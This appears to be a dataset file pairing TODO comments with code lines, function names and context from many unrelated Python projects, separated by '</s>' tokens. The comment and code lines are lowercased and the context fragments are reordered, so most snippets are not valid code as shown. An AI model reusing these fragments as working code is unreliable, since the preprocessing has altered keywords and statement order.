# todo: fixed by using realpath, but there should be a cleaner </s> assert_equal(	_test_AnnexDB db.save() db2 = cls(annex=annex) set(db2.get_obsolete()), {opj(realpath(path), p) for p in ['file1.txt', filep2, '2git']})
# '-rs',  # @todo: manually remove dependencies of conflicting packages, </s> '-r',	cli_install_packages 'sudo', 'pacman', '--noconfirm', ] + packages_to_be_removed,
# todo : error on unmatched alias </s> log.exception('validation failed for action alias data=%s.', action_alias)	post raise AmbiguityError("Too much choice, not enough action (alias).") except (ValidationError, ValueError, ValueValidationException) as e: pecan.abort(http_client.BAD_REQUEST, str(e)) return
self.mechanism_bin = serialize(value, to_bytes=true)  # todo: techdebt fix </s> def mechanism(self, value: any) -> none:	mechanism @mechanism.setter
# todo(okuta): check type </s> return _statistics._ndarray_nanstd(axis=axis, dtype=dtype, out=out,	nanstd return a.std(axis=axis, dtype=dtype, out=out, ddof=ddof, keepdims=keepdims) ddof=ddof, keepdims=keepdims)
# todo enable ssh on the nodes by changing the image </s> d = client.add(node_1_name, image)	get_node_ips node_2_name = random_name() image = u"openshift/busybox-http-app" d.addCallback(lambda _: client.add(node_2_name, image)) d.addCallback(lambda _: client.list())
# todo: change this to use a getter </s> if self.options.verbose > 2:	check_xml print(self.valid_xml_msg) else: try: ET.fromstring(content)
#todo: add_land arg </s> print("usage: rally <list|load|save|add|clear>")	cmd_rally print "Saved rally file ", args[1]; else:
raise notimplementederror # todo </s> def em_step(self):	EM_step
prob_dist = results[0]#[-1] # todo: used for old model architecture </s> note = np.random.choice(len(prob_dist), p=prob_dist)	generate for i in range(N): results = model.predict([np.array([x]) for x in zip(*history)]) note_hot = one_hot(note, NUM_CLASSES) beat_input = compute_beat(i, NOTES_PER_BAR)
# todo: delete me </s> try:	initialize storage_client = storage.Client() self.bucket = storage_client.create_bucket(self.bucketName) self.files = self.uri.get_bucket(headers=self.headerValues, validate=True) except GSResponseError:
raise notimplementederror # todo </s> else:	_format_request raise NotImplementedError # TODO elif style == 'pyformat': UnsupportedParamStyleError(style) return (request, parameters)
# todo? don't consider the empty set here </s> for cause_subset in utils.powerset(possible_causes):	contexts possible_causes = np.where(np.sum(network.connectivity_matrix, 1) > 0)[0] possible_effects = np.where(np.sum(network.connectivity_matrix, 0) > 0)[0] for effect_subset in utils.powerset(possible_effects): if cause_subset and effect_subset:
# todo: add a check for similarly valid value back in time. maybe if it the </s> current_timestamp = timelib.timestamp.getnow()	VerifyFile if timestamp <= 0: return False if timestamp > current_timestamp + self._SIX_YEARS_IN_MICRO_SECONDS: return False
# todo(jakevdp): remove when minimum jaxlib is has extension version 4 </s> if self._thread_local_state.enable_x64 is none:	x64_enabled return lib.jax_jit.get_enable_x64() else: self._thread_local_state.enable_x64 = bool(self.read('jax_enable_x64')) return self._thread_local_state.enable_x64
# todo: add a better throttling mechanism </s> if 'sleep' in kwargs:	get_posts_by_search options = {k: True for k in options} options.setdefault('word', word) warnings.warn( "The sleep parameter has been removed, it won't have any effect.", stacklevel=2
# todo move to common? </s> def _sanitize(p: path) -> str:	_sanitize return re.sub(r'\W', '_', str(p))
# todo(dcramer): this would make more sense as part of the xunit handler </s> num_tests = db.session.query(	sync_build if not is_finished: raise sync_build.NotFinished func.sum(ItemStat.value) ).filter(
# todo_recorders - need to pass in parent info instead of none </s> metadata = create_local_meta(none, 'nonlinearrunonce')	solve subsys._solve_nonlinear() system._check_reconf_update() update_local_meta(metadata, (1,)) self._rec_mgr.record_iteration(self, metadata)
# todo: fill these in </s> comp_type = completion_state_e.first	_GetCompletionType comp_words: list of words.  First word is used for dispatching. TODO: what about hash table name? prefix = '' words = []
except (asyncio.cancellederror, asyncio.timeouterror) as err:  # todo: is this needed? </s> log.error("%s downloading blob from %s:%i", str(err), self.peer_address, self.peer_port)	_write if self._response_fut and not self._response_fut.done(): self._response_fut.set_exception(err) if self._response_fut and not self._response_fut.done(): self._response_fut.set_exception(err)
# todo: refactor me, please! </s> if self._args.get('export_step'):	_execute r = run_worker(p, self.__image_steps, config=self._args) self.__image_steps.append(r) if self._args.get('export_step') == (step-1): step_path = self._args.get('export_step_path') or os.path.join(self.__output_path, '..', 'export.png')
# todo: this needs serious refactoring </s> if self._taa_text is none:	LoadClient if is_trustee is False: raise Exception("Submitter role must be TRUSTEE") await self._taa_init(taa_text, taa_version) if is_trustee is None:
# todo for pytorch 2.0.4, need to set dim=1 for log_softmax or use softmax then take log </s> loss_arc = self.logsoftmax(out_arc.transpose(0, 2)).transpose(0, 2)	loss minus_mask_e = (1 - mask_e) * minus_inf out_arc = out_arc + minus_mask_d.view(batch, max_len_d, 1) + minus_mask_e.view(batch, 1, max_len_e) loss_type = self.logsoftmax(out_type.transpose(0, 2)).transpose(0, 2) if mask_e is not None:
# todo: i bet this interferes with views whose column names can </s> try:	__getattr__ def __getattr__(self, attr): if isinstance(attr, basestring) and attr.startswith('_'): return self.__dict__[attr] except KeyError:
# todo: use tor proxy session </s> return hosts	apiGetHosts print("# found {0} valid torbridge hosts".format(len(hosts)))
# todo document after plugin data is refactored </s> def execute_exec_plugin(plugin, command):	execute_exec_plugin expected_arguments = checkdicts(plugin, 'require') structure = checkdicts(plugin, 'structure')
# todo: migrate to sql </s> synclog_ids = get_synclog_ids_by_date(start_datetime, end_datetime)	SyncLogStagingTable @classmethod def record_iter(cls, start_datetime, end_datetime): return iter_docs(SyncLog.get_db(), synclog_ids)
# todo: remove when transition to python3 complete </s> return frd(self.fresp/other.fresp, self.omega)	__truediv__ "FRD.__truediv__ is currently implemented only for SISO systems.")
self.__top.start()  # todo overriding internals </s> self.__top.stop()	__test def __test(self, mode): self.__top.add_receiver(mode, key='a')
# todo: check if this logic is sufficient </s> for cindex in set(bottom.kinfo.coefficient_map	extruded_horizontal_facet ) index = top.indices + top.kinfo.coefficient_map): c = exp.coefficients()[cindex]
# todo: investigate django how this can be avoided </s> frm = inspect.stack()[1]  # frm[1] is caller file name, frm[3] is caller function name	_default_manager def _default_manager(self): if len(sys.argv) > 1 and sys.argv[1] == 'dumpdata': if DUMPDATA_COMMAND in frm[1]:
# todo: determine language based on preprocessing information. </s> preferred_language = self._preferred_language or 'en-us'	ParseOptions helpers_manager.ArgumentHelperManager.ParseOptions( options, self, names=argument_helper_names) output_mediator = self._CreateOutputMediator(preferred_language) self._ReadMessageFormatters(output_mediator)
# todo: if not standalone, call ipc directly rather than </s> import zim.ipc	ZimCmd if not args: return Application(cmd) if not zim.ipc.in_child_process(): args = args + ('--standalone',)
# todo: allow units to be added/removed </s> elif units < ps.units:	execute_signal if units == ps.units: self.close_position(currency_pair) return elif units > ps.units:
# todo(tsileo): handle tombstone </s> data = db.outbox.find_one({'id': item_id, 'meta.deleted': false})	outbox_activity @app.route('/outbox/<item_id>/activity') def outbox_activity(item_id): if not data: abort(404)
# todo put this in a .extra w/a subselect </s> if not hasattr(self, '_hours_worked'):	hours_worked @property def hours_worked(self): self._hours_worked = Entry.objects.filter( user=self.contact.user,
# todo: implement this. </s> pass	test_add_key def test_add_key(self):
# [[shape], kernel, stride] #todo: add padding </s> param_list = [[[1, 3, 10, 10], 2, 2],	test_maxpool def test_maxpool(): workspace.ResetWorkspace() [[2, 3, 5, 5], 1, 1], [[2, 2, 7, 7], 3, 2],
# todo: validate </s> def print_bitboard(bitboard):	print_bitboard PIECE_CHARS = [ [ " ", u"\u2659", u"\u2658", u"\u2657", u"\u2656", u"\u2655", u"\u2654" ],
" # todo: i18n", </s> '-print("hello world!")',	test_process_hunks_invalid_hunks " ", " ", '+print(tr("Hello world!"))', " ",
# todo: should be a method on shape. </s> self.rotz += v	rotateIncZ def rotateIncZ(self,v):
# todo: check syntax </s> return values[-1]	content_md5 @SingleFieldValue def content_md5(self, name, values):
# todo: return errors in a universal way </s> print("shivyc: error: no such file or directory: '{}'"	main c_file = open(arguments.file_name) except IOError: .format(arguments.file_name)) return
# todo(john sirois): clean this up when build parse refactoring is tackled. </s> unused_resolved_binary = self.binary	JvmApp return super(JvmApp, self).dependencies def resolve(self): unused_resolved_bundles = self.bundles for resolved in super(JvmApp, self).resolve():
# todo: verify behavior </s> self.assert_received(self.debugger, [])	test_unknown_reason ])
if python_version < 340 or true: # todo: temporarily reverted: </s> type = expressionvariableref(	wrapSuperBuiltin if type is None and python_version >= 300: provider = node.getParentVariableProvider() variable_name = "__class__", source_ref    = source_ref
# todo put an index.html in front of this bucket </s> yield effect(uploadtos3recursively(	upload_python_packages '--dist-dir={}'.format(scratch_directory.path)], cwd=top_level.path) source_path=scratch_directory, target_bucket=target_bucket,
pass  # todo: raise error to force subclasses to implement it </s> def _activate(self):	_activate
# todo(rkukura): filter on extended provider attributes. </s> nets = self._filter_nets_l3(context, nets, filters)	get_networks self._extend_network_dict_provider(context, net) self._extend_network_dict_l3(context, net) return [self._fields(net, fields) for net in nets]
for char in ('\\', '\n', '\t'):  # todo: more escapes? </s> value = value.replace(char, char.encode('unicode-escape'))	String def serialize(self, value): if isinstance(value, unicode): value = value.encode('utf-8') return value
# todo: out to file </s> pass	write_up def write_up(self):
# todo: paginate </s> topics = topic.objects.filter(is_removed=true)	topic_deleted @administrator_required def topic_deleted(request): context = {'topics': topics, } return render(request, 'spirit/admin/topic/topic_deleted.html', context)
# todo: reconsider logging level when we have consistent practice. </s> logger.warning(msg=msg, extra=dict(cls=none))	_build_mesh " -- ignoring this as it is inconsistent." ) node_dimension = None edge_dimension = getattr(mesh_var, "edge_dimension", None)
# todo: add test and check this more throughroughly. </s> if hasattr(layer, "activation"):	contains_activation Check whether the layer contains an activation function. activation is None then we only check if layer can contain an activation. if activation is not None: return layer.activation == keras.activations.get(activation)
# todo: must be implemented </s> pass	get_range_selection def get_range_selection(self, chapter_count, volume_count):
# todo: cleanup and deprecate worker_address in config files, leaving only checksum_address </s> federated = bool(config_class.peek(filepath=filepath, field='federated_only'))	extract_checksum_address_from_filepath default_name = config_class.generate_filename() if filename == default_name: if federated: checksum_address = config_class.peek(filepath=filepath, field='checksum_address')
# directory exists, but no todo.txt file - create an empty one </s> open(todotxt_file_path, 'a').close()	main directory = os.path.dirname(todotxt_file_path) if os.path.isdir(directory): else: sys.stderr.write("ERROR: The directory: '{0}' does not exist\n".format(directory))
# todo: set cchq_case_id in dhis2 </s> pass	push_child_entities Register child entities in DHIS2 and enroll them in the Pediatric Nutrition Assessment and Underlying Risk Assessment programs.
# todo: error handling like numba callwrappers.py </s> native_val = unbox_array(types.array(dtype=dtype, ndim=1, layout='c'), arr_obj, c)	lower_unbox_df_column arr_obj = c.pyapi.object_getattr_string(args[0], "values") dtype = sig.args[2].dtype return native_val.value
if field.unique or field.primary_key:  # todo: multi-fields. </s> query.append(field == kwargs.pop(field_name))	insert_or_update for field_name, value in list(kwargs.items()): field = cls._meta.fields[field_name] return cls.update(**kwargs).where(*query).execute()
# todo -1 here added because that is done in rot90, but will have to be fixed </s> assert np.allclose(kpsoi_aug.keypoints[0].x, 5 - 2 - 1)	test_Augmenter_augment_keypoints aug = iaa.Rot90(1, keep_size=False) kpsoi_aug = aug.augment_keypoints(kpsoi) assert np.allclose(kpsoi_aug.keypoints[0].y, 1) assert np.allclose(kpsoi_aug.keypoints[1].x, 5 - 5 - 1)
'xception'      : [testmodels.coremlemit, testmodels.cntkemit, testmodels.mxnetemit, testmodels.pytorchemit, testmodels.tensorflowemit], #  todo: caffe(crash) testmodels.kerasemit(too slow) </s> }	get_test_table 'squeezenet'    : [TestModels.CaffeEmit, TestModels.CntkEmit, TestModels.CoreMLEmit, TestModels.KerasEmit, TestModels.MXNetEmit, TestModels.PytorchEmit, TestModels.TensorflowEmit], 'voc-fcn32s'    : [TestModels.CntkEmit, TestModels.CoreMLEmit, TestModels.TensorflowEmit], } else:
# todo: refactor, move to utils </s> dict = {}	get_form_data_context def get_form_data_context(self, form_data): if form_data: for field in form_data:
# todo - send file in chunks if file size > some threshold. </s> headers = {'content-type': 'application/json',	scan for fname in filelist: with open(fname, "rb") as sample: 'user_agent': conf['user agent'], 'filename': basename(fname)}
# todo: should we ignore and use 0.0.0.0, or try using what the user asked and fail? </s> log.warning('the interface %s is down. ignoring', opts[u'source_interface'])	resolve_dns log.debug('Using %s as source IP address', ret[u'source_ip']) else: else: log.warning('%s is not a valid interface. Ignoring.', opts[u'source_interface'])
# todo: add prompt to specify user and pass manually. </s> sess = requests.session()	malwr print_error("You need to specify a user/pass") return sess.auth = (MALWR_USER, MALWR_PASS) sess.get(MALWR_LOGIN, verify=False)
return # todo raise error </s> if value:	set_Shuffle if not self.get_CanControl(): logger.debug(u'Setting %s.Shuffle not allowed', PLAYER_IFACE) self.backend.playback.shuffle = True else:
# self.assertisnotnone(result_set.query_planning_time_in_millis)  # todo flaky test </s> self.assertisnotnone(result_set.output_location)	test_fetchone self.assertIsNotNone(result_set.query_queue_time_in_millis) self.assertIsNotNone(result_set.total_execution_time_in_millis) self.assertIsNone(result_set.data_manifest_location)
# todo: test without file </s> def test_impl():	test_nunique_str_parallel def test_nunique_str_parallel(self): df = pq.read_table('example.parquet').to_pandas() return df.two.nunique()
# todo: move this into onnx main library </s> return m[device.type]	get_device_option DeviceType.CUDA: '/gpu:0'}
# todo: handle multiple skip stacks </s> (skip, skip_stack), = skip_stack.items()	flex_layout original_skip_stack = skip_stack if skip_stack is not None: if box.style['flex_direction'].endswith('-reverse'): children = children[:skip + 1]
# todo this is not right, but does it need to be? </s> return ['tags']	value_columns return [] elif 'case' in val: elif 'call' in val: return ['tags']
# todo change this and other yml names to match the tutorial </s> deployment_moved_config = temp.child(b"deployment.yml")	deploy_and_move })) flocker_deploy(deployment_config, application_config) deployment_moved_config.setContent(safe_dump({ u"version": 1,
# todo do a proper mro resolution. currently we are just listing </s> for cls in self.py_bases():	py_mro mro.add(cls) mro = [self] add(cls) for cls_new in cls.mro():
# todo handle 4 types of transition exceptions </s> pass	create_next next_status = TransactionStatusTransition.next(previous_transaction, action, provider) except Exception: except Exception: pass
# todo uncomment the actual test below after we have implemented the l1 attack </s> **self.attack_param)	test_adv_example_success_rate_l1 NotImplementedError, self.help_adv_examples_success_rate, ord=1,
# todo(solitude): remove this. </s> email = data.get('email')	acquire_refund_permission request.GET['verification_code']) data = paypal.get_personal_data(token) if email != addon.paypal_id: paypal_log.debug('Addon paypal_id and personal data differ: '
# todo: not close enough </s> self.assertalmostequal(corr, 1.0, 7)	test_template_matching_time np.testing.assert_allclose(cc, result, atol=0.000001) shift, corr = xcorr_max(cc) self.assertEqual(shift, 0)
# todo: better error reporting </s> logging.warning("can't execute ndisc6, please install if missing")	StartMaster utils.RunCmd(["ndisc6", "-q", "-r 3", master_ip, master_netdev]) except errors.OpExecError: if err_msgs: _Fail("; ".join(err_msgs))
# todo support startblock, endblock </s> self.disconnect()	_processBlockEvents if reg_num.disconnect:
# todo(jin feng) always output the unhandled exception details into a log file. </s> _exit_and_fail(msg)	_unhandled_exception_hook else: msg += '\nNo specific exception message.\n'
# todo: translate </s> context["title"] = "archive"	task_render_archive output_name = os.path.join( "output", path("archive", None, lang)) context["items"] = [(year, link("archive", year, lang)) for year in years] yield generic_post_list_renderer(
# todo: check proactive neighbor resolution </s> self.asserttrue(self.packet_outs_from_flows(echo_replies))	test_icmp_ping6_unknown_neighbor 'ipv6_dst': 'fc00::1:4', 'echo_request_data': bytes('A'*8, encoding='UTF-8')})
# todo: call into expression language. </s> self._next(lex_mode)  # get )	_ParseCallArguments self._Next(lex_mode)  # Skip ( self._Peek() self._Peek() if self.token_type != Id.Op_RParen:
# todo: consider using eafp here instead. </s> if value is _not_found:	resolve value = self.get(parts[0], _NOT_FOUND) for part in parts[1:]: break value = _get_value(value, part)
# todo return empty list if not loaded </s> spotify.error.maybe_raise(self.error)	tracks def tracks(self): Will always return :class:`None` if the search isn't loaded. if not self.is_loaded: return None
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> sampleparameters = {	test_acquire_token_with_user_pass def test_acquire_token_with_user_pass(self): "tenant" : "common", "authorityHostUrl" : "https://login.windows.net",
# todo(termie): this stuff should probably be moved to middleware </s> if not context['is_admin']:	validate_token def validate_token(self, context, token_id, belongs_to=None): Optionally, also ensure that it is owned by a specific tenant. user_token_ref = self.token_api.get_token(context['token_id']) creds = user_token_ref['extras'].copy()
# todo have one global properties object so this is no longer necessary </s> exporter.node_cache.clear()	export def export(self, exporter, props, luxcore_name): color = self.inputs["Color"].export(exporter, props, luxcore_name) if not self.inputs["Color"].is_linked:
# todo: wrap exception </s> return contracts_decorate(function, **kwargs)	wrap def wrap(function):
# todo: _busy_wait should timeout after n seconds </s> gpio.input.return_value = gpio.low	test_init_what_setup Verify our expectations for GPIO setup in order to catch regressions. from inky import InkyWHAT inky = InkyWHAT('red') inky.setup()
if isinstance(err, asyncio.cancellederror):  # todo: remove when updated to 3.8 </s> raise err	BlobAnnouncer log.debug("failed to announce %s, could only find %d peers, retrying soon.", blob_hash[:8], peers) except Exception as err: log.warning("error announcing %s: %s", blob_hash[:8], str(err)) async def _announce(self, batch_size: typing.Optional[int] = 10):
# todo(slaweq): change this to neutron floating ips and turn neutron </s> mock_nova.floating_ips.list.return_value = [fake_floating_ip]	test_create_server_wait_server_error mock_nova.servers.get.return_value = build_server mock_nova.servers.list.side_effect = [[build_server], [error_server]] self.assertRaises( exc.OpenStackCloudException,
# todo: make the get_closest_value to return region </s> number, number_index = self.get_closest_value(	get_current_numeric_value if self.current_value: return False self.view.substr(self.view.line(self.region)), self.view.line(self.region).begin(),
# todo: py3 typeerror: a bytes-like object is required, not 'str' </s> filep.write(buf)	putdata return "" else: filep.close() return buf
#@todo: recheck in 0.4.10 </s> def setup_base(self):	setup_base plugin = self.pyload.pluginManager.hosterPlugins[self.classname] klass  = getattr(plugin['module'], plugin['name'])
pass  # todo: implement this </s> def numeric_keypad_mode(self):	numeric_keypad_mode
# todo(dcramer): we should default offset to previous entry in logsource </s> kwargs.setdefault('offset', 0)	create_logchunk def create_logchunk(self, source, text=None, **kwargs): kwargs['job'] = source.job kwargs['project'] = source.project
# todo: if !blocking... </s> self.__exclusive_acquire()	acquire self.__nwait_shr -= 1 else: finally: self.__lock.release()
# todo: rate limiting </s> p_ctx.active = true	handle_rpc contexts = self.generate_contexts(initial_ctx, in_string_charset) p_ctx, others = contexts[0], contexts[1:] if p_ctx.in_error: return self.handle_error(p_ctx, others, p_ctx.in_error,
# todo(rakhmerov): it's not stable, need to avoid race condition. </s> eventlet.sleep(delay * 2)	test_retry_delay {'output': 'result'}) tasks = db_api.tasks_get(WB_NAME, execution['id']) self.engine.convey_task_result(WB_NAME, execution['id'], tasks[0]['id'], states.ERROR,
# todo: theme me </s> labels = []	draw title = TextArea(self.title, textprops=dict(color='k', weight='bold')) entries = [title] for txt in self.key['label']: labels.append(TextArea(txt, textprops=dict(color='k')))
# todo: clean up </s> for _ in range(num_hosts)	gossipsubs )
step = 0.1  # todo </s> step = 7.0	find_all2 raise ValueError('your start_time {} is later than your end_time {}' .format(start_time, end_time)) jd = arange(jd0, jd1, step) end_mask = linspace(0.0, 1.0, num)
# todo remove </s> calls_iterator = iter(expression_list)	eval_expression_list p = precedence.create_precedence(expression_list) return self._process_precedence_element(p) or [] for each in calls_iterator: result += self._eval_statement_element(each)
# todo: add also video files? </s> for item in folder.walkdirs(errors='warn'):	on_task_filter continue log.verbose('Scanning path %s ...' % folder) if item.name.lower() in self.skip: continue
#assert false, "todo: implement" </s> pass	Table self.has_pawns = "P" in filename if self.has_pawns: else: black_part, white_part = filename.split("v")
# todo: prettify output </s> root_check()	main else: if enable: print("Enabling") gnome_power_enable()
# todo: implement this method </s> return self._handles	handles @property def handles(self):
# todo repition of normalization may be wasteful on large phase diagrams </s> if entry.normalize() not in [e.normalize() for e in self.stable_entries]:	get_decomp_and_quasi_e_to_hull for all entries in the decomp reaction where amount is the amount of the fractional composition. The energy is given per atom. return self.get_decomp_and_e_above_hull(entry, allow_negative=True) if stable_only:
# todo: should we restore the user-registered handler? </s> if (line is not none and line != self.prev_line and	InteractiveLineReader finally: signal.signal(signal.SIGINT, _DoNothing) self.line_input is not None): self.line_input.add_history(line.rstrip())  # no trailing newlines
# todo: hack </s> network_authentication_id = container_stacks[0].getmetadataentry("network_authentication_id")	read stack = container_stacks[0] if self._resolve_strategies["machine"] == "override": network_authentication_key = container_stacks[0].getMetaDataEntry("network_authentication_key") container_stacks[0].deserialize(archive.open(container_stack_file).read().decode("utf-8"))
# todo: improve logic to handle simple types like list of strings? </s> try:	try_json_loads def try_json_loads(value: Any) -> Any: return srsly.json_loads(value) except ValueError:
# todo: support multi-index here </s> if len(index_scols) != 1:	filter elif like is not None: if axis in ('index', 0): raise ValueError("Single index must be specified.") sdf = sdf.filter(index_scols[0].contains(like))
# todo: obviously incrementing the rows individually is bad. how </s> for i, word_piece_slice in enumerate(wp_rows):	set_annotations align_sizes = xp.array(align_sizes, dtype="f") wp_weighted = wp_tensor / align_sizes.reshape((-1, 1)) doc.tensor[i] += wp_weighted[word_piece_slice].sum(axis=0) doc.user_hooks["vector"] = get_doc_vector_via_tensor
# todo: not implemented yet </s> messager.warning('text search not implemented yet, sorry!')	search_text def search_text(directory, text): return format_results(SearchMatchSet('empty'))
# todo extend to nonbinary nodes </s> if i not in self._input_indices and i in self.context.node_indices:	__init__ else: self._dimension_labels.append(None) past_tpm_on = past_tpm_on.sum(i, keepdims=True) / 2 past_tpm_off = past_tpm_off.sum(i, keepdims=True) / 2
# todo. optionally sort on birthdate </s> for child_handle in childlist:	display_ind_relationships of.write('\t\t\t\t\t<ol>\n') childlist = [child_ref.ref for child_ref in childlist] self.display_child_link(of, child_handle) of.write('\t\t\t\t\t</ol>\n')
# todo: remove when we stop supporting python < 3.5 </s> if sys.version_info.major < 3 or sys.version_info.minor < 5:	transform X_embedded : `numpy.ndarray`, shape=(n_samples, n_components) The embedded data points. check_is_fitted(self, ['preprocessor_', 'components_']) else:
# todo: this is a debug level log </s> logger.info(io.open(config_file, "rt", encoding="utf-8").read())	_load_configuration return config, config_file_exists logger.info("Reading config file {}:".format(config_file)) try: config.read_file(io.open(config_file, "rt", encoding="utf-8"))
#todo: mock the socket! </s> try:	test_sessionkeys sessions = {} sut = telnet.telnet(sessions) sut.handle(None, ['192.168.1.200', 51000]) except:
# todo replace with clone </s> self.warning_detector = copy.deepcopy(base_warning_detector)  # actual detector used	__init__ if base_warning_detector is not None: self.disable_background_learner = False else: self.disable_background_learner = True
# todo: check aligned nans, (s1.notna() != s2.notna()).any() </s> return ((s1-ma)*(s2-mb)).sum()/(s1.count()-1.0)	_column_cov_impl ma = S1.mean() mb = S2.mean()
# todo: capture makedirs invocation here </s> expect([ 'path/to/git', 'init'],	test_nonexistant_ref self.basedir) + 0, self.basedir_source, sendRC=False, timeout=120, usePTY=False)
#todo: dataset/hda by id (from history) or check_ownership for anon user </s> hda = self.get_history_dataset_association( trans, history, history_content_id,	display and ( history_id == trans.security.encode_id( trans.history.id ) ) ): history = trans.history check_ownership=False, check_accessible=True ) else:
# todo(cp16net): need to set the return code correctly </s> return wsgi.result(views.instancesview(servers).data(), 201)	index tenant=tenant_id) servers = models.Instances(context).data()
pass # todo: pass link problem upstream? </s> return r"%s<a href='%s' class='nocode'>%s</a>%s" % (	link_to qlink = urljoin(red.link_parser.base, link) except ValueError, why: matchobj.group(1), u"?uri=%s" % e_query_arg(qlink),
# todo(stephenfin): the mock of 'migrate_disk_and_power_off' should </s> with mock.patch(	test_resize_bug_1879878 flavor_b_id = self._create_flavor( vcpu=2, extra_spec={'hw:cpu_policy': 'dedicated'}) 'nova.virt.libvirt.driver.LibvirtDriver' '.migrate_disk_and_power_off', return_value='{}',
# todo: update this to the correct kaggle.gcp path once we no longer inject modules </s> from kaggle_gcp import get_integrations, publicbigqueryclient, kagglekernelcredentials	init_bigquery from google.cloud import bigquery from google.cloud.bigquery._http import Connection if get_integrations().has_bigquery(): from google.cloud.bigquery import magics
# todo extract that to a method in otc(...) ? </s> offers = [self.otc.get_offer(offer_id + 1) for offer_id in range(self.otc.get_last_offer_id())]	update_otc_orders print(f"The exchange rate we can get is: {base_conversion.rate}") print(f"Allowed range for our offers is: {base_conversion.rate - self.sell_gem_max_gap} - {base_conversion.rate - self.sell_gem_min_gap}") offers = [offer for offer in offers if offer is not None] our_buy_offers = list(filter(lambda offer: offer.owner == self.our_address and
# rbarlow_todo: convert this callrequest into a celery task call </s> call_request = callrequest(manager.update_content, args, kwargs, weight=weight, tags=tags, archive=true, asynchronous=true)	consumer_content_update_itinerary tags = [resource_tag(dispatch_constants.RESOURCE_CONSUMER_TYPE, consumer_id), action_tag('unit_update')] call_request.add_control_hook(dispatch_constants.CALL_CANCEL_CONTROL_HOOK, cancel_agent_request) call_request.reads_resource(dispatch_constants.RESOURCE_CONSUMER_TYPE, consumer_id)
# todo: this should be handled in run_script </s> os.unlink(pid_file)	run stderr('Warning: Disconnected. Reconnecting in %s seconds...' % delay) time.sleep(delay) os._exit(0)
# todo: normalise by s**-.5? </s> return output	morlet output -= np.exp(-0.5 * (w**2)) output *= np.exp(-0.5 * (x**2)) * np.pi**(-0.25)
#todo get this working </s> self._test_can('search', self.mrloggedin, ['--', 'r-', 'w-', 'rr', 'wr', 'ww'])	test_admin_search_deleted self._test_can('search', self.admin, ['--', 'r-', 'w-', 'rr', 'wr', 'ww', 'deleted'])
# todo: figure out what to do with this list </s> self.fd = fd[0]	__init__ def __init__(self, fd): if fd < 0 or fd >= 256: raise ValueError("invalid fd specified")
# todo: this test is covered by the previous class, do we need a dedicated one? </s> pass	test_xyY_to_munsell_colour def test_xyY_to_munsell_colour(self): Tests :func:`colour.computation.colourspaces.munsell.xyY_to_munsell_colour` definition.
# todo: this might be too slow because of the addition </s> data = reduce(lambda res, (key,val): res + int(val)*[key], data.iteritems(), [] )	get elif config.get('compress', False): data = self._client.hgetall(interval_key) if config.get('read_cast'): data = map(config.get('read_cast'), data)
# todo: check against plural_rules[lang]['nplurals'] </s> try:	translate else: num = parameters index = plural_rules[code]['plural'](num) except KeyError:
# todo include efficientnet </s> elif isinstance(model, custom_models.mnistnet.mnistnet):	get_classifier_module elif isinstance(model, torchvision.models.Inception3): raise NotImplementedError() clf = 'fc2' else:
from vyper.old_codegen.expr import expr  # todo rethink this circular import </s> pos = getpos(stmt_expr)	lll_for_self_call def lll_for_self_call(stmt_expr, context):
# todo: figure out how to best show this kind of warning to the </s> st.warning(('streamlit does not support hashing classes. '	_to_bytes return self.to_bytes(obj.__name__) elif inspect.isclass(obj): 'We did not hash `%s`.') % obj.__name__) return self.to_bytes(obj.__name__)
# @todo: possible optimisation: create a re.compile list </s> if self.get_conf_value('show', header=header) == []:	is_show Example for diskio: show=sda.* return True else:
# todo: there’s a vertical 0.5px shift on the second page </s> assert_pixels('collapsed_border_thead', 22, 36, '''	test_tables_9 @assert_no_logs def test_tables_9(): ______________________ _BBBBBBBBBBBBBBBBBBBB_
# todo: sound feedback to signal that this is an invalid action </s> return	speed_up def speed_up(self): if self.speed_is_paused(): if self.timer.ticks_per_second in GAME_SPEED.TICK_RATES: i = GAME_SPEED.TICK_RATES.index(self.timer.ticks_per_second)
except exception as error:  # todo: be specific </s> self.bot.error(exception=error)	run except KeyboardInterrupt: raise time.sleep(10.0)  # seconds
# todo: ... </s> dumpdata(get_dump_path('blog.txt'), data)	dump_channel def dump_channel(data):
# todo: finish this. </s> pass	readlink def readlink(self, path):
assert self.stop_seq is none #todo: better handling of this situation </s> l.debug("initializing stop sequence")	stop_program def stop_program(self): assert self.start_seq is None #TODO: Better handling of this situation self.stop_seq = sequence_controller() for p in self.roaster:
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> sampleparameters = {	test_acquire_token_with_user_pass def test_acquire_token_with_user_pass(self): "tenant" : "common", "authorityHostUrl" : "https://login.windows.net",
return -1  # todo: followup after decision around returning none </s> layer_name = self.vol.layer_name	get_session_id if hasattr(self, "Session"): if self.Session == 0: symbol_table_name = self.get_symbol_table().name kvo = self._context.memory[layer_name].config['kernel_virtual_offset']
# todo: more variables on the same line? </s> match = variable_use_rx.match(line)	parse out.write(":root {\n") not_just_variable_declarations = True if match and match.group('key') in variables: out.write(match.group('before'))
# todo(luotao): use clone() method to flush the program.desc in force, </s> return program.clone()	transpile self._adjust_input() self._remove_unused_var()
# todo: move to base class </s> super(canvasbase, self).drawbackground(painter, rect)	drawBackground def drawBackground(self, painter, rect): lod = self.getCanvasLodValueFromCurrentScale() self.boundingRect = rect
# todo: the following skipped suite and fixtures should be enabled </s> return ['api-key']	_filter_headers def _filter_headers(self):
# todo do something with temp </s> self._remove_substates_from_subhmms()	HSMMSubHMMStates super(HSMMSubHMMStates,self).clear_caches() def resample(self,temp=None): super(HSMMSubHMMStates,self).resample() # resamples superstates self._resample_substates()
f.writable = false # @todo: currently this hides the widget from update forms instead of just rendering read-only! </s> crud_fields.append(s3sqlinlinelink("activity",	customise_req_need_resource show_link = True ) field = "activity_id", label = T("Commits"),
# todo policyuniverse can't expand resource wildcards so further thought is needed here </s> session.run(	load_role_policies for policy_name, policy_data in policies.items(): for role_arn in _find_roles_assumable_in_policy(policy_data): ingest_policies_assume_role, RoleName=role_name,
# todo tests for this </s> is_dev = not is_release(version)	get_package_key_suffix :return bytes: The suffix for the keys in which packages for a version are stored. if is_dev: return "-testing"
# todo: header fields might vary across file types, thus prior sensing would be needed </s> header_fields = header_list[0].keys()	process_file if opts.header_fields: if opts.header_fields == 'all': else: header_fields = opts.header_fields.split(',')
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_fetchpage_loop pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
